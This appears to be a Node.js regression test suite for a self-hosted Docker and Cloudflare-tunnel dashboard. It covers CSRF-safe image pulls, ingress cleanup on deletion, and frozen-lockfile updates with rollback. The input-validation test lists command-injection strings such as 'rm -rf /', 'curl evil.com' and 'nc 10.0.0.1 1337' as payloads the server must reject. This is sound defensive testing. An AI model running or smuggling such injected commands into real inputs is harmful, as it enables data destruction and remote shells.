import assert from "node:assert/strict";
import http from "node:http";
import express from "express";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { PassThrough } from "node:stream";
import { createRequire } from "node:module";

// Isolate test environment
const testTmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "home-cloud-f2-test-"));
process.env.HOME = testTmpDir;
process.env.XDG_CONFIG_HOME = path.join(testTmpDir, ".config");
process.env.HOME_CLOUD_CONFIG_DIR = path.join(testTmpDir, ".config", "home-cloud");
process.env.AGENT_ENV_FILE = path.join(testTmpDir, ".env");
process.env.CF_CONFIG = path.join(testTmpDir, ".cloudflared", "config.yml");
process.env.BASE_DIR = testTmpDir;
process.env.CF_DOMAIN = "example.test";
process.env.JWT_SECRET = "f2-test-jwt-secret-32-chars-minimum-length";
process.env.PASSWORD = "f2-test-password-12345";
process.env.NODE_ENV = "test";

const configPath = process.env.CF_CONFIG;
fs.mkdirSync(path.dirname(configPath), { recursive: true });

process.once("exit", () => {
	try {
		fs.rmSync(testTmpDir, { recursive: true, force: true });
	} catch (_) {}
});

const require = createRequire(import.meta.url);
const yaml = require("js-yaml");
const tunnel = require("../tunnel.js");
tunnel.restartTunnel = async () => "https://test.example";
const Docker = require("dockerode");

// Stub Docker modem and methods
let pullCalls = [];
let removedContainers = [];
let containerInspectMap = {};

Docker.prototype.pull = async function (imageName) {
	pullCalls.push(imageName);
	const stream = new PassThrough();
	return stream;
};

const dummyDocker = new Docker();
dummyDocker.modem.constructor.prototype.followProgress = function (stream, onFinished, onProgress) {
	setTimeout(() => {
		if (typeof onProgress === "function") {
			onProgress({ status: "Extracting", id: "layer1", progressDetail: { current: 50, total: 100 } });
		}
		if (typeof onFinished === "function") {
			onFinished(null, [{ status: "success" }]);
		}
	}, 10);
};

Docker.prototype.getContainer = function (id) {
	return {
		inspect: async () => {
			if (containerInspectMap[id]) return containerInspectMap[id];
			return {
				Id: id,
				State: { Running: false, Status: "exited" },
				NetworkSettings: { Ports: {} },
				HostConfig: { PortBindings: {} },
			};
		},
		remove: async () => {
			removedContainers.push(id);
			return {};
		},
	};
};

let customListContainers = null;
Docker.prototype.listContainers = async function (...args) {
	if (customListContainers) {
		return customListContainers(...args);
	}
	return [];
};

// Load routes and services after stubs are ready
const dockerRouter = require("../routes/docker.js");
const composeRouter = require("../routes/compose.js");
const ingressService = require("../services/ingress.js");
const updateManager = require("../services/updateManager.js");

// Setup Express test application
const app = express();
app.use(express.json());
app.use("/api/docker", dockerRouter);
app.use("/api/docker/compose", composeRouter);

const server = http.createServer(app);
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const { port } = server.address();
const baseUrl = `http://127.0.0.1:${port}/api/docker`;

console.log("🧪 Running Regression Tests for Fixer F2 Security Findings...\n");

try {
	// =========================================================================
	// [Suite 1] CSRF & Image Pull Security (GET disabled, POST validated)
	// =========================================================================
	console.log("[Suite 1] CSRF & Image Pull Security");

	// 1a. GET /api/docker/images/pull must be rejected with 405 Method Not Allowed
	pullCalls = [];
	const getPullRes = await fetch(`${baseUrl}/images/pull?image=attacker.example/malicious:latest`);
	assert.equal(
		getPullRes.status,
		405,
		"GET /api/docker/images/pull must return 405 Method Not Allowed"
	);
	const getPullBody = await getPullRes.json();
	assert.ok(
		getPullBody.error && getPullBody.error.includes("Method not allowed"),
		"GET /api/docker/images/pull must return error explanation"
	);
	assert.equal(pullCalls.length, 0, "GET /api/docker/images/pull must NEVER trigger docker.pull");
	console.log("  ✔ GET /api/docker/images/pull returns 405 and does not trigger docker.pull");

	// 1b. POST /api/docker/images/pull rejects missing, empty, or invalid images with 400
	const invalidPayloads = [
		{},
		{ image: "" },
		{ image: "   " },
		{ image: 12345 },
		{ image: null },
		{ image: true },
		{ image: "ubuntu; rm -rf /" },
		{ image: "alpine && curl evil.com" },
		{ image: "alpine | nc 10.0.0.1 1337" },
		{ image: "bad`id`" },
		{ image: "-leading-hyphen:latest" },
		{ image: "a".repeat(256) }, // Exceeds 255 chars
	];

	for (const payload of invalidPayloads) {
		const res = await fetch(`${baseUrl}/images/pull`, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify(payload),
		});
		assert.equal(
			res.status,
			400,
			`POST /api/docker/images/pull must reject invalid payload ${JSON.stringify(payload)} with 400`
		);
		assert.equal(pullCalls.length, 0, "Invalid payload must not trigger docker.pull");
	}
	console.log("  ✔ POST /api/docker/images/pull correctly rejects missing, malformed, and injection payloads with 400");

	// 1c. POST /api/docker/images/pull with valid image name triggers pull and streams progress
	pullCalls = [];
	const validPostRes = await fetch(`${baseUrl}/images/pull`, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ image: "alpine:3.18" }),
	});
	assert.equal(validPostRes.status, 200, "POST /api/docker/images/pull with valid image must return 200");
	assert.equal(validPostRes.headers.get("content-type"), "text/event-stream");

	const reader = validPostRes.body.getReader();
	const decoder = new TextDecoder();
	let sseOutput = "";
	while (true) {
		const { done, value } = await reader.read();
		if (done) break;
		sseOutput += decoder.decode(value);
	}
	assert.equal(pullCalls.length, 1, "docker.pull must be called exactly once");
	assert.equal(pullCalls[0], "alpine:3.18", "docker.pull must be called with the requested image name");
	assert.ok(sseOutput.includes("Extracting"), "SSE output must include progress event");
	assert.ok(sseOutput.includes("success"), "SSE output must include completion status");
	console.log("  ✔ POST /api/docker/images/pull triggers pull and streams SSE progress correctly");

	// =========================================================================
	// [Suite 2] Ingress Cleanup on Container & Stack Deletion
	// =========================================================================
	console.log("\n[Suite 2] Ingress Cleanup on Container & Compose Stack Deletion");

	// Write initial cloudflared config containing system rules + app rules
	const initialConfig = {
		tunnel: "test-tunnel-id",
		"credentials-file": "/tmp/test-tunnel.json",
		ingress: [
			{ hostname: "dash.example.test", service: "http://localhost:3000" },
			{ hostname: "ssh.example.test", service: "ssh://localhost:22" },
			{ hostname: "container-app.example.test", service: "http://localhost:18080" },
			{ hostname: "compose-app.example.test", service: "http://localhost:19090" },
			{ service: "http_status:404" },
		],
	};
	fs.writeFileSync(configPath, yaml.dump(initialConfig, { lineWidth: -1 }), { mode: 0o600 });

	// 2a. Deleting a stopped container removes its mapped host port ingress rule
	containerInspectMap["stopped-test-container"] = {
		Id: "stopped-test-container",
		State: { Running: false, Status: "exited" },
		NetworkSettings: { Ports: { "80/tcp": null } }, // Empty runtime map for stopped container
		HostConfig: {
			PortBindings: {
				"80/tcp": [{ HostIp: "", HostPort: "18080" }],
			},
		},
	};

	removedContainers = [];
	const deleteContainerRes = await fetch(`${baseUrl}/containers/stopped-test-container/delete`, {
		method: "DELETE",
	});
	assert.equal(deleteContainerRes.status, 200, "DELETE /containers/:id/delete should return 200");
	assert.ok(removedContainers.includes("stopped-test-container"), "Container must be removed");

	const configAfterContainerDelete = yaml.load(fs.readFileSync(configPath, "utf8"));
	const servicesAfterContainerDelete = configAfterContainerDelete.ingress.map((r) => r.service);
	const hostnamesAfterContainerDelete = configAfterContainerDelete.ingress.map((r) => r.hostname);

	assert.ok(!servicesAfterContainerDelete.includes("http://localhost:18080"), "Ingress rule on port 18080 must be removed");
	assert.ok(hostnamesAfterContainerDelete.includes("dash.example.test"), "Protected system rule 'dash' must stay");
	assert.ok(hostnamesAfterContainerDelete.includes("ssh.example.test"), "Protected system rule 'ssh' must stay");
	console.log("  ✔ Deleting stopped container removes its ingress rule while 'dash' and 'ssh' stay intact");

	// 2b. Deleting a compose project stack removes its ingress rule
	const composeProjectName = "testproj";
	const composeFolder = path.join(testTmpDir, ".home-cloud", "compose", composeProjectName);
	fs.mkdirSync(composeFolder, { recursive: true });
	const composeYamlContent = `services:
  web:
    image: nginx
    ports:
      - "19090:80"
`;
	fs.writeFileSync(path.join(composeFolder, "docker-compose.yml"), composeYamlContent, "utf8");

	customListContainers = async () => [
		{
			Id: "compose-container-web-1",
			Names: ["/testproj_web_1"],
			Labels: {
				"com.docker.compose.project": composeProjectName,
				"com.docker.compose.service": "web",
			},
			Ports: [{ PrivatePort: 80, PublicPort: 19090, Type: "tcp" }],
			State: "running",
		},
	];

	containerInspectMap["compose-container-web-1"] = {
		Id: "compose-container-web-1",
		NetworkSettings: { Ports: { "80/tcp": [{ HostPort: "19090" }] } },
		HostConfig: { PortBindings: { "80/tcp": [{ HostPort: "19090" }] } },
	};

	const deleteComposeRes = await fetch(`${baseUrl}/compose/${composeProjectName}`, {
		method: "DELETE",
	});
	assert.equal(deleteComposeRes.status, 200, "DELETE /compose/:name should return 200");

	const configAfterComposeDelete = yaml.load(fs.readFileSync(configPath, "utf8"));
	const servicesAfterComposeDelete = configAfterComposeDelete.ingress.map((r) => r.service);
	const hostnamesAfterComposeDelete = configAfterComposeDelete.ingress.map((r) => r.hostname);

	assert.ok(!servicesAfterComposeDelete.includes("http://localhost:19090"), "Compose ingress rule on port 19090 must be removed");
	assert.ok(hostnamesAfterComposeDelete.includes("dash.example.test"), "Protected system rule 'dash' must stay");
	assert.ok(hostnamesAfterComposeDelete.includes("ssh.example.test"), "Protected system rule 'ssh' must stay");
	console.log("  ✔ Deleting compose project removes its ingress rule while 'dash' and 'ssh' stay intact");

	// 2c. Protected rules cannot be removed by removeIngressByPort even if port matches
	const protectedPortResultDash = await ingressService.removeIngressByPort(3000);
	assert.equal(protectedPortResultDash, false, "removeIngressByPort must not remove dash system rule");
	const protectedPortResultSsh = await ingressService.removeIngressByPort(22);
	assert.equal(protectedPortResultSsh, false, "removeIngressByPort must not remove ssh system rule");

	const configAfterProtectedAttempt = yaml.load(fs.readFileSync(configPath, "utf8"));
	const hostnamesAfterProtected = configAfterProtectedAttempt.ingress.map((r) => r.hostname);
	assert.ok(hostnamesAfterProtected.includes("dash.example.test"));
	assert.ok(hostnamesAfterProtected.includes("ssh.example.test"));
	console.log("  ✔ Ingress service strictly refuses to remove protected system rules 'dash' and 'ssh'");

	// 2d. Ingress cleanup failure does NOT block container delete
	containerInspectMap["fail-cleanup-container"] = {
		Id: "fail-cleanup-container",
		HostConfig: { PortBindings: { "80/tcp": [{ HostPort: "9999" }] } },
	};
	const origRestart = tunnel.restartTunnel;
	tunnel.restartTunnel = async () => { throw new Error("Simulated tunnel reload failure"); };

	const deleteWithFailedCleanup = await fetch(`${baseUrl}/containers/fail-cleanup-container/delete`, {
		method: "DELETE",
	});
	assert.equal(deleteWithFailedCleanup.status, 200, "Container delete must succeed even if ingress cleanup fails");
	const deleteData = await deleteWithFailedCleanup.json();
	assert.equal(deleteData.success, true);
	tunnel.restartTunnel = origRestart;
	console.log("  ✔ Ingress cleanup failure is logged and does not block container deletion");

	// =========================================================================
	// [Suite 3] Updater Frozen-Lockfile Enforcement & Auto-Rollback
	// =========================================================================
	console.log("\n[Suite 3] Updater Frozen-Lockfile Enforcement & Rollback");

	// 3a. When pnpm install --frozen-lockfile fails, updateManager aborts and rolls back
	updateManager._resetForTesting();
	const updateCommands = [];
	const progressEvents = [];

	updateManager._setMockRunCommand(async (cmd, args) => {
		const fullCmd = `${cmd} ${args.join(" ")}`;
		updateCommands.push(fullCmd);
		if (cmd === "git" && args[0] === "ls-remote") {
			return { stdout: `deadbeef\t${args[args.length - 1]}\n`, stderr: "" };
		}
		if (cmd === "git" && args[0] === "status") return { stdout: "", stderr: "" };
		if (cmd === "git" && args[0] === "rev-parse" && args[1] === "HEAD") {
			return { stdout: "safe-initial-sha-5555\n", stderr: "" };
		}
		if (cmd === "pnpm" && args.includes("--frozen-lockfile")) {
			throw new Error("ERR_PNPM_LOCKFILE_CONFIG_MISMATCH: Lockfile not up to date");
		}
		return { stdout: "ok", stderr: "" };
	});

	await assert.rejects(
		async () => {
			await updateManager.applyUpdate(
				(p) => progressEvents.push(p),
				{ targetTag: "v1.2.0", skipRestart: true }
			);
		},
		/ERR_PNPM_LOCKFILE_CONFIG_MISMATCH/,
		"applyUpdate must abort immediately when frozen-lockfile install fails"
	);

	assert.equal(updateManager.isUpdating(), false, "isUpdating must be reset to false");
	assert.ok(
		updateCommands.some((c) => c === "git checkout safe-initial-sha-5555"),
		"Git rollback to initial commit must be triggered"
	);

	// Invariant: Updater must NEVER fall back to non-frozen pnpm install
	const executedNonFrozenInstall = updateCommands.some(
		(c) => c === "pnpm install" || (c.startsWith("pnpm install") && !c.includes("--frozen-lockfile"))
	);
	assert.equal(
		executedNonFrozenInstall,
		false,
		"Updater must NEVER execute non-frozen pnpm install"
	);

	const rollbackEvent = progressEvents.find((e) => e.stage === "rollback");
	assert.ok(rollbackEvent, "Rollback event must be emitted");
	console.log("  ✔ Updater aborts and rolls back on frozen install failure and NEVER runs non-frozen install");

	console.log("\n🎉 All Regression Tests for Fixer F2 Passed Successfully!");
} finally {
	await new Promise((resolve) => server.close(resolve));
}
